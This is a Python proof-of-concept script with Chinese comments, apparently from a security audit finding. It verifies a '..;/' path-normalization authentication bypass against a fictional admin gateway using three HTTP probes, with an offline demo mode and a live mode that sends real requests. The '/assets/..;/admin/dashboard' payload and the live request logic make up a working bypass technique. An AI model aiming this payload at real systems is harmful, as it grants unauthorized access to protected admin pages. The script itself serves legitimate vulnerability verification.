#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# output/poc-acme-002.py — ACME-F-002 `..;/` 路径归一化认证绕过重放 PoC（脱敏演示，虚构目标）
#
# 用法:
#   python output/poc-acme-002.py --demo    # 离线回放验证逻辑（不发包，默认）
#   python output/poc-acme-002.py           # 实模式（连接失败属预期）
#
# 判别三连（playbook-semicolon-path-normalization-bypass 同族方法）:
#   P1 直连 /admin/dashboard → 401（确认鉴权存在）
#   P2 /assets/..;/admin/dashboard 无 Cookie → 200（绕过成立）
#   P3 假资源 /assets/..;/not-exist → 404（确认非网关统一放行）

import sys
import urllib.error
import urllib.request
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):
        pass

GATEWAY = "https://admin.demo-acme.example.com"  # 虚构目标
REPLAY_SIGNATURE = '"total_orders": 128'

# ---- 离线回放样本（虚构证据）----
DEMO_RESPONSES = {
    ("P1", "/admin/dashboard"): (401, '{"error": "unauthorized"}'),
    ("P2", "/assets/..;/admin/dashboard"): (
        200,
        '{"order_summary": {"total_orders": 128, "total_amount": 356800.0}, "page": "dashboard"}',
    ),
    ("P3", "/assets/..;/not-exist"): (404, '{"error": "not found"}'),
}


def http_get(url, timeout=10):
    req = urllib.request.Request(url, headers={"User-Agent": "poc-acme-002"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, f"连接失败（虚构目标，预期行为）: {e}"


def main():
    demo = "--demo" in sys.argv
    print(f"===== PoC ACME-F-002 `..;/` 认证绕过重放（{'离线回放' if demo else '实模式'}）=====")
    print(f"目标: {GATEWAY}（不携带任何 Cookie/Authorization）\n")

    steps = [
        ("P1", "/admin/dashboard", "P1 直连 · 鉴权存在性确认"),
        ("P2", "/assets/..;/admin/dashboard", "P2 绕过 · 路径归一化绕过"),
        ("P3", "/assets/..;/not-exist", "P3 反证 · 排除网关统一放行"),
    ]
    results = {}
    for key, path, label in steps:
        if demo:
            status, body = DEMO_RESPONSES[(key, path)]
        else:
            status, body = http_get(f"{GATEWAY}{path}")
        results[key] = (status, body)
        print(f"[{label}] {path}")
        print(f"  → HTTP {status}")
        print(f"  响应: {body[:140]}\n")

    # ---- 判别判定 ----
    p1, p2, p3 = results["P1"], results["P2"], results["P3"]
    ok_p1 = p1[0] == 401
    ok_p2 = p2[0] == 200 and REPLAY_SIGNATURE in p2[1]
    ok_p3 = p3[0] == 404

    print("===== 判别三连判定 =====")
    print(f"  {'✅' if ok_p1 else '❌'} P1 直连 401 → 鉴权确实存在")
    print(f"  {'✅' if ok_p2 else '❌'} P2 无 Cookie 绕过返回 200 + 业务签名命中 → 绕过成立")
    print(f"  {'✅' if ok_p3 else '❌'} P3 假资源 404 → 非网关统一放行")

    # ---- 反事实补强 ----
    print("\n===== 反事实补强 =====")
    print(f"  {'✅' if ok_p1 else '❌'} 去掉 ..;/ 即 401 → 确认是归一化差异而非接口本身无鉴权")
    print(f"  {'✅' if ok_p2 else '❌'} 未携带任何凭据 → 未授权成立")

    passed = ok_p1 and ok_p2 and ok_p3
    print(f"\n结论: {'VERIFIED（认证绕过成立）' if passed else '保留 candidate，需补证据'}")
    return 0 if passed else 1


if __name__ == "__main__":
    sys.exit(main())
